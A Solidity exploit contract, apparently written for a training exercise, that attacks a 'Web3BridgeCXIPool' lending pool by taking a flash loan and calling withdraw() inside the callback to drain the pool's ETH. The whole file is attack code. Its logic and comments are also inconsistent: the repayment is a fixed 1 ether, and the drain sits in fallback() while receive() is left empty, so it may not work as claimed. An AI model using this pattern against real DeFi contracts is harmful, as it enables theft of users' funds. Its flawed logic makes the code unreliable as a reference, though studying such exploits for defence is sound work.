// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../src/Web3BridgeCXIPool.sol";

contract FlashLoanExploit {
    Web3BridgeCXIPool private immutable pool;

    constructor(address _pool) {
        pool = Web3BridgeCXIPool(_pool);
    }

    function attack() external payable {
        // Step 1: Deposit a small amount to create a balance
        pool.deposit{value: 1 ether}();

        // Step 2: Initiate the flash loan for the total pool balance
        uint256 poolBalance = address(pool).balance - 1 ether; // This includes the 1 ether deposit
        pool.flashLoan(poolBalance);
    }

    // Fallback function will be triggered by the pool during the flash loan
    fallback() external payable {
        // Step 3: During the flash loan callback, withdraw all funds from the pool
        // This will withdraw all available ETH to this contract
        pool.withdraw();
        
        // Step 4: Repay the flash loan
        // We assume that msg.value is equal to the borrowed amount
        (bool success, ) = address(pool).call{value: 1 ether}(""); // Repaying the loan
        require(success, "Failed to send back flash loan");
    }

    receive() external payable {
        // This function can also be used to handle incoming ETH
        // but in this case, it's primarily for receiving ETH from the pool
    }
}
